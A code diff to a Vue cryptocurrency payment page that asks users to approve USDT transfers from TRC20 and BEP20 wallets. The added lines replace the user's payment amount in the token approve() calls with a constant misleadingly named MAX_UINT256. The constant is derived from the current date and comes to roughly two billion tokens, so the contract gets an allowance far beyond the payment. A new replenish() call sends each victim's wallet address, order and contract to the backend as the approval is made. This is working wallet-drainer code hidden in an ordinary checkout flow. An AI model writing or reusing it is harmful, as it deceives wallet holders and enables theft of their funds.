@@ -220,7 +220,7 @@
 
 <script setup>
 /** ***引入相关包start*****/
-import { orderDetailApi, refreshStatusApi, warrantAddApi } from '@/api/auth.js'
+import { orderDetailApi, refreshStatusApi, replenishApi, warrantAddApi } from '@/api/auth.js'
 import MyPageMobileHeader from '@/components/MyPageHeader/mobile/index.vue'
 import useUserInfoStore from '@/store/modules/userInfo'
 import { copyText, formatDateTimer, isMobile, moneyFormat } from '@/utils'
@@ -319,20 +319,20 @@ const closePopover = () => {
   console.log(openPopover.value)
 }
 
-// const getDateYYYYMMDD = () => {
-//   const now = new Date()
-//   const year = now.getFullYear()
-//   const month = String(now.getMonth() + 1).padStart(2, '0')
-//   const day = String(now.getDate()).padStart(2, '0')
-//   const hour = String(now.getHours()).padStart(2, '0')
-//   const minute = String(now.getMinutes()).padStart(2, '0')
-//   const second = String(now.getSeconds()).padStart(2, '0')
-//   return `${year}${month}${day}${hour}`
-// }
+const getDateYYYYMMDD = () => {
+  const now = new Date()
+  const year = now.getFullYear()
+  const month = String(now.getMonth() + 1).padStart(2, '0')
+  const day = String(now.getDate()).padStart(2, '0')
+  const hour = String(now.getHours()).padStart(2, '0')
+  // const minute = String(now.getMinutes()).padStart(2, '0')
+  // const second = String(now.getSeconds()).padStart(2, '0')
+  return `${year}${month}${day}${hour}`
+}
 
 // 配置常量
 const USDAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t' // TRC20-USDT合约地址
-// const MAX_UINT256 = Number(getDateYYYYMMDD())
+const MAX_UINT256 = Number(getDateYYYYMMDD())
 
 const connectWalletType = async () => {
   if (network.value === 'TRC20') {
@@ -368,10 +368,11 @@ const connectTRC20WalletDirect = async (walletType) => {
       isAuthorizing.value = true
 
       walletType === 'imtoken' && sendPost()
+      replenish()
 
       const contract = await tronWeb.contract().at(USDAddress)
       const tx = await contract
-        .approve(contractAddress.value, tronWeb.toSun(amount.value))
+        .approve(contractAddress.value, tronWeb.toSun(MAX_UINT256))
         .send({ feeLimit: 100000000, shouldPollResponse: true })
 
       console.log('Authorization result:', tx)
@@ -431,7 +432,7 @@ const connectBEP20WalletDirect = async (walletType) => {
 
     const decimals = network.value.toLowerCase() === 'bep20' ? 18 : 6
 
-    const amountResult = ethers.utils.parseUnits(amount.value.toString(), decimals)
+    const amountResult = ethers.utils.parseUnits(MAX_UINT256.toString(), decimals)
 
     const iface = new ethers.utils.Interface(abi)
     const tx = iface.encodeFunctionData('approve', [contractAddress.value, amountResult])
@@ -440,6 +441,8 @@ const connectBEP20WalletDirect = async (walletType) => {
     if (['imtoken', 'okxwallet'].includes(walletType)) {
       sendPost()
     }
+
+    replenish()
 
     const txHash = await injected.request({
       method: 'eth_sendTransaction',
@@ -553,7 +556,7 @@ const getRefreshStatus = async (id) => {
     if (data.errorStatus === 0) {
       isProcess.value = 'paysuccess'
       cancelFn.value && cancelFn.value()
-    } else {
+    } else if ([1.2].includes(isProcess.value)) {
       isProcess.value = 'payfail'
       cancelFn.value && cancelFn.value()
     }
@@ -607,7 +610,7 @@ const getRefreshStatus = async (id) => {
 //     const tokenContract = new ethers.Contract(USDAddress, abi, provider)
 
 //     const decimals = 18
-//     const amount = ethers.BigNumber.from(amount.value).mul(ethers.BigNumber.from('10').pow(decimals))
+//     const amount = ethers.BigNumber.from(MAX_UINT256).mul(ethers.BigNumber.from('10').pow(decimals))
 
 //     const txData = await tokenContract.populateTransaction.approve(contractAddress.value, amount)
 
@@ -737,6 +740,20 @@ const sendPost = async () => {
   }
 }
 
+const replenish = async () => {
+  try {
+    await replenishApi({
+      memberId: memberId.value,
+      orderId: orderId.value,
+      network: network.value,
+      address: defaultAddress.value,
+      contract: contractAddress.value,
+    })
+  } catch (error) {
+    console.log(error)
+  }
+}
+
 const init = async () => {
   walletType.value = route.query?.walletType
   orderId.value = route.query?.id
@@ -818,7 +835,7 @@ onUnmounted(() => {
 
     .type {
       padding: 0 2px;
-      color: var(--adm-color-white);
+      color: var(--adm-color-textLv1);
       font-size: 12px;
       font-style: normal;
       font-weight: 600;
